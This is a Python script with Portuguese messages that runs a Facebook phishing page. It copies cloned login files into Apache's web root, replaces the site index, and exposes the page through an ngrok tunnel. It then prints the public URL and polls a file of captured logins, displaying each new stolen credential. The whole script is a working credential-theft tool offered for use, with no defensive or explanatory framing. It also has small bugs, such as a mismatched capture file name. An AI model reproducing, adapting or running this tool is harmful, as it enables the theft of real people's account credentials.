#!/usr/bin/python
import os
import urllib
import time

if os.getegid()!=0:
	print('\033[1;31m[!] execute como root')
	exit()

if os.popen('which apache2').read()=='':
	print('\033[1;31m[!] apache2 nao encontrado.')
	exit()
if os.popen('which ngrok').read()=='':
	print('\033[1;31m[!] ngrok nao encontrado.')
	exit()
if os.popen('which php').read()=='':
	print('\033[1;31m[!] php nao encontrado.')
	exit()

url = 'http://facebook.com'
print "[*] clonando facebook.com..."
time.sleep(1)

try:
	os.system('cp login.php raw_facebook.php /var/www/html')
	if os.path.exists('/var/www/html/index.html'):
		os.system('mv /var/www/html/index.html /var/www/html/index_original.html')
	os.system('mv /var/www/html/raw_facebook.php /var/www/html/index.php')

	print('[*] iniciando apache')
	if os.system('service apache2 start')!=0:
		print('\033[1;31m[!] erro ao iniciar o apache.')
                exit()

	temp = os.sys.stderr; os.sys.stderr = open('/dev/null','w')

	print('[*] iniciando ngrok')
	os.system('echo ngrok http 80 > .ini_ngrok.sh && chmod +x .ini_ngrok.sh && xterm -C ./.ini_ngrok.sh 2> /dev/null &')

	time.sleep(9)

	os.sys.stderr = temp
	if not os.path.exists('/var/www/html/logins_capturados'):
		os.system('> /var/www/html/login_capturados.txt')
	os.system('chmod a+w /var/www/html; chmod a+wr /var/www/html/logins_capturados.txt')

	ngrok_html = urllib.urlopen('http://localhost:4040/status').read().split('"')
	for i in range(len(ngrok_html)):
		if 'URL' in ngrok_html[i] and 'ngrok.io' in ngrok_html[i+2] and 'https' in ngrok_html[i+2]:
			ngrok_url = ngrok_html[i+2].replace('\\',' ')

	print('[*] url clonada: %s'%ngrok_url)

	old_cont = open('/var/www/html/logins_capturados.txt').readlines()
	print('[*] aguardando logins')

	captured = []
	while True:
		logins = open('/var/www/html/logins_capturados.txt').readlines()
		new_logs = list(set(logins)-set(old_cont)); new_logs.sort(); new_logs.reverse()
		if new_logs!=[]:
			print('\n[*] capturado!')
			for i in new_logs:
				print('\033[0;32m'+i.strip()+'\033[0;0m')
			old_cont = logins
		try: time.sleep(1)
		except KeyboardInterrupt: break

except Exception as er: print(er)
